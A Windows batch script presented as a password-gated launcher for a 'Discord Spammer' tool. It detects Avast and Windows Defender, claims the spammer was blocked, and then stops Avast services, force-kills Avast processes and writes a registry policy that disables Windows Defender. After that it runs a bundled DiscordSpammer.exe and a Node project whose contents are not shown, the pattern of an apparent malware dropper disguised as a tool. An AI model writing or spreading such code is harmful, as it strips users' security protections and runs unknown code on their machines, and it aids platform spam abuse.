@echo off 
////////////////////////////DON'T CHANGE THAT SOURCE - YOU MAY BREAK SOMETHING////////////////////////////////
////////////////////////////DON'T CHANGE THAT SOURCE - YOU MAY BREAK SOMETHING////////////////////////////////
////////////////////////////DON'T CHANGE THAT SOURCE - YOU MAY BREAK SOMETHING////////////////////////////////
@echo off
:B
cls
SET MyFile=Aswidsagen*
cls
ECHO "%MyFile%"
cls
TASKLIST | FINDSTR /I "%MyFile%"
cls
@echo off
IF ERRORLEVEL 1 (GOTO :Next1) ELSE (ECHO "%MyFile%" Discord Spammer was blocked by your Avast Antivirus!)
echo Please Disable your Antivirus to continue.
pause
Net Stop "avast! Antivirus"
Net Stop "avast! iAVS4 Control Service" 
Net Stop "avast! Mail Scanner"
Net Stop "avast! Web Scanner"
taskkill /im avas* /f
cls
echo you can continue now
pause

:Next1
SET MyFile=MSASCui.exe
cls
ECHO "%MyFile%"
cls
TASKLIST | FINDSTR /I "%MyFile%"
cls
@echo off
IF ERRORLEVEL 1 (GOTO :Next2) ELSE (ECHO "%MyFile%" Discord Spammer was blocked by your Windows Defender Antivirus!)
echo Please Disable your Antivirus to continue.
pause
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /t REG_DWORD /v DisableAntiSpyware /f /d 1
cls
echo you can continue now
pause


:Next2
color a
@echo off
echo Read the Instructions first!
echo If you get an Error. Please disable your Antivirus and download the Spammer again.
:Ask
set INPUT=
set /P INPUT=Enter the correct password and press Enter: %=%
If /I "%INPUT%"=="DiscordTools" goto right
START CMD /C "ECHO @echo off 
color c
echo WRONG PASSWORD!
echo msgbox"Wrong Password!",vbExclamation , "Password"> msg.vbs
src\msg.vbs
exit

:right
@echo off
start src\application\DiscordSpammer.exe
cd src
node .
pause